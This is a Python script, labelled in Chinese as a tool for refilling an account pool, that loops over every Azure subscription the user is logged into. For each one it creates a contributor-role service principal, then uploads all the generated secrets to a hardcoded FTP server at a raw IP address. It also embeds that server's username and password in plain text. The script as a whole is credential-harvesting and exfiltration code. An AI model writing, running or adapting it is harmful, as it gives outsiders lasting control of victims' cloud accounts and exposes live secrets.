#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import subprocess
import sys
import ftplib
from datetime import datetime
from io import BytesIO
import random
import string

# FTP配置
FTP_CONFIG = {
    "host": "172.96.161.56",
    "port": 9751,
    "username": "yeqiu",
    "password": "7NbcnXWkzccC7ciG",
    "remote_dir": ""  # 远程目录
}

def safe_print(*args, **kwargs):
    """安全输出函数"""
    print(*args, **kwargs)

def test_ftp_connection():
    """测试FTP连接"""
    try:
        safe_print("\n正在测试FTP连接...")
        ftp = ftplib.FTP()
        ftp.connect(FTP_CONFIG["host"], FTP_CONFIG["port"])
        ftp.login(FTP_CONFIG["username"], FTP_CONFIG["password"])
        
        # 获取当前目录
        current_dir = ftp.pwd()
        safe_print(f"FTP登录成功，当前目录: {current_dir}")
        
        # 如果指定了远程目录，尝试切换
        if FTP_CONFIG["remote_dir"]:
            try:
                ftp.cwd(FTP_CONFIG["remote_dir"])
                safe_print(f"✓ 成功切换到目录: {FTP_CONFIG['remote_dir']}")
            except Exception as e:
                safe_print(f"⚠ 无法切换到指定目录 {FTP_CONFIG['remote_dir']}: {e}")
                safe_print("将使用当前目录进行上传")
                FTP_CONFIG["remote_dir"] = ""
        
        safe_print("✓ FTP连接测试成功")
        ftp.quit()
        return True
    except Exception as e:
        safe_print(f"✗ FTP连接测试失败: {e}")
        return False

def upload_to_ftp(filename, content):
    """上传内容到FTP服务器"""
    try:
        ftp = ftplib.FTP()
        ftp.connect(FTP_CONFIG["host"], FTP_CONFIG["port"])
        ftp.login(FTP_CONFIG["username"], FTP_CONFIG["password"])
        
        # 如果指定了远程目录，尝试切换
        if FTP_CONFIG["remote_dir"]:
            try:
                ftp.cwd(FTP_CONFIG["remote_dir"])
            except Exception as e:
                safe_print(f"⚠ 无法切换到目录 {FTP_CONFIG['remote_dir']}: {e}")
                safe_print("将上传到当前目录")
        
        # 将内容转换为字节流
        bio = BytesIO(content.encode('utf-8'))
        
        # 上传文件
        ftp.storbinary(f'STOR {filename}', bio)
        ftp.quit()
        
        safe_print(f"✓ 成功上传文件到 FTP: {filename}")
        return True
    except Exception as e:
        safe_print(f"✗ 上传文件失败: {filename}, 错误: {e}")
        return False

def generate_filename():
    """生成文件名"""
    timestamp = datetime.now().strftime("%Y%m%d%H%M")
    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=4))
    return f"yeqiu{timestamp}{random_chars}.json"

def check_azure_login():
    """检查 Azure CLI 是否登录"""
    try:
        result = subprocess.run(
            ["az", "account", "show"], 
            check=True, 
            capture_output=True, 
            text=True
        )
        safe_print("✓ 已登录 Azure 账户")
        return True
    except subprocess.CalledProcessError:
        safe_print("! 您尚未登录 Azure CLI，请先登录")
        try:
            subprocess.run(["az", "login"], check=True)
            safe_print("✓ Azure 登录成功")
            return True
        except subprocess.CalledProcessError as e:
            safe_print(f"Azure 登录失败: {e}")
            safe_print("请手动运行 'az login' 命令登录后再运行此脚本")
            return False

def get_subscriptions():
    """获取所有订阅ID"""
    try:
        result = subprocess.run(
            ["az", "account", "list", "--query", "[].id", "-o", "tsv"],
            check=True,
            capture_output=True,
            text=True
        )
        subscription_ids = result.stdout.strip().split('\n') if result.stdout.strip() else []
        return [sub_id for sub_id in subscription_ids if sub_id]
    except subprocess.CalledProcessError as e:
        safe_print(f"获取订阅列表失败: {e}")
        return []

def create_service_principal(subscription_id):
    """为指定订阅创建服务主体"""
    try:
        safe_print(f"正在为订阅创建服务主体: {subscription_id}")
        
        result = subprocess.run(
            ["az", "ad", "sp", "create-for-rbac", 
             "--role", "contributor", 
             "--scopes", f"/subscriptions/{subscription_id}"],
            check=True,
            capture_output=True,
            text=True
        )
        
        credential = json.loads(result.stdout)
        safe_print("  ✓ 服务主体创建成功")
        return credential
        
    except subprocess.CalledProcessError as e:
        safe_print(f"  ✗ 创建服务主体失败: {e}")
        if e.stderr:
            safe_print(f"    错误详情: {e.stderr}")
        return None
    except json.JSONDecodeError as e:
        safe_print(f"  ✗ 解析服务主体返回数据失败: {e}")
        return None

def main():
    """主函数"""
    safe_print("叶秋号池补号专用（提API）")
    safe_print("Azure 服务主体批量创建脚本 - Python版本")
    safe_print("=" * 60)
    
    # 检查FTP连接
    if not test_ftp_connection():
        safe_print("FTP连接失败，程序退出")
        return
    
    # 检查Azure登录状态
    if not check_azure_login():
        return
    
    # 获取所有订阅
    safe_print("\n正在获取订阅列表...")
    subscription_ids = get_subscriptions()
    
    if not subscription_ids:
        safe_print("未找到任何订阅，请确保已登录Azure CLI")
        return
    
    safe_print(f"找到 {len(subscription_ids)} 个订阅")
    
    # 为每个订阅创建服务主体
    all_credentials = []
    counter = 0
    
    for subscription_id in subscription_ids:
        counter += 1
        safe_print(f"\n[{counter}/{len(subscription_ids)}] 处理订阅: {subscription_id}")
        
        credential = create_service_principal(subscription_id)
        if credential:
            all_credentials.append(credential)
    
    if not all_credentials:
        safe_print("\n未成功创建任何服务主体")
        return
    
    safe_print(f"\n成功创建 {len(all_credentials)} 个服务主体")
    
    # 生成JSON内容
    safe_print("正在生成JSON文件...")
    
    if len(all_credentials) == 1:
        # 单个服务主体，直接输出对象
        json_content = json.dumps(all_credentials[0], ensure_ascii=False, indent=2)
    else:
        # 多个服务主体，输出数组
        json_content = json.dumps(all_credentials, ensure_ascii=False, indent=2)
    
    # 生成文件名并上传
    filename = generate_filename()
    safe_print(f"准备上传文件: {filename}")
    
    try:
        if upload_to_ftp(filename, json_content):
            safe_print(f"✓ 脚本执行完成！成功上传文件: {filename}")
            safe_print(f"  包含 {len(all_credentials)} 个服务主体信息")
        else:
            safe_print("✗ 文件上传失败")
            
            # 如果上传失败，尝试使用纯数字文件名
            safe_print("尝试使用纯数字文件名重新上传...")
            numeric_filename = f"{datetime.now().strftime('%Y%m%d%H%M%S')}.json"
            
            if upload_to_ftp(numeric_filename, json_content):
                safe_print(f"✓ 使用纯数字文件名上传成功: {numeric_filename}")
            else:
                safe_print("✗ 所有上传尝试都失败了")
                safe_print("可能的原因:")
                safe_print("1. FTP服务器限制")
                safe_print("2. 网络问题") 
                safe_print("3. 权限问题")
                
                # 将内容保存到本地文件作为备份
                try:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write(json_content)
                    safe_print(f"已将内容保存到本地文件: {filename}")
                except Exception as e:
                    safe_print(f"保存本地文件也失败: {e}")
                    
    except Exception as e:
        safe_print(f"处理过程中出现错误: {e}")

if __name__ == "__main__":
    main()
